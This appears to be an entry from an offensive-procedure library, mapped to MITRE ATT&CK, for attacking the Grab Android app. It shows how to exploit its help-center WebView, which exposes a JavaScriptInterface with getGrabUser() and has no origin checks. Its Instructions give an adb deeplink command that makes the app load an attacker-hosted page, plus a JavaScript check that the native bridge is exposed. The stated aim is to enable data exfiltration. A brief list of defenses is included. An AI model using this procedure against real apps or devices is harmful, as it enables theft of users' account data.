---
id: proc-grab-load-webview
tags:
  - webview
  - javascriptinterface
  - android
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:25:22.876Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Load-Malicious-Page-in-WebView-with-Exposed-Interface

## Summary

This procedure triggers the deeplink to load the malicious page in the Grab app's WebView, exposing the Android JavaScriptInterface for cross-context access.

## Description

The ZendeskSupportActivity configures the WebView with addJavascriptInterface, binding a WebAppInterface object to the 'Android' namespace, including the @JavascriptInterface-annotated getGrabUser() method. This allows JavaScript from the loaded page to call native methods without origin checks.

## Requirements

1. Device with Grab app and debugging enabled
2. Hosted malicious page URL
3. ADB or direct link triggering capability

## Defense

Defensive measures and detection strategies:

- Disable JavaScriptInterface or use @JavascriptInterface only on trusted origins
- Enforce WebViewClient shouldOverrideUrlLoading for URL validation
- Log JavaScript bridge calls for anomaly detection

## Objectives

1. Inject arbitrary content into app context
2. Access exposed native interfaces
3. Bridge to data exfiltration

## Instructions

### Step 1: Trigger Deeplink

**Context**: Invoke the scheme to open WebView.

Click the trigger link or use ADB:

```bash
adb shell am start -W -a android.intent.action.VIEW -d "grab://open?screenType=HELPCENTER&page=https://s3.amazonaws.com/edited/page2.html" com.grab.pax
```

> WebView loads page2.html. Expected output: Interface 'Android' available in JS console.

### Step 2: Verify Exposure

**Context**: Test interface accessibility.

In WebView dev tools (if enabled) or page JS: console.log(window.Android);

**Expected Output**: Object with getGrabUser method visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- webview
- android
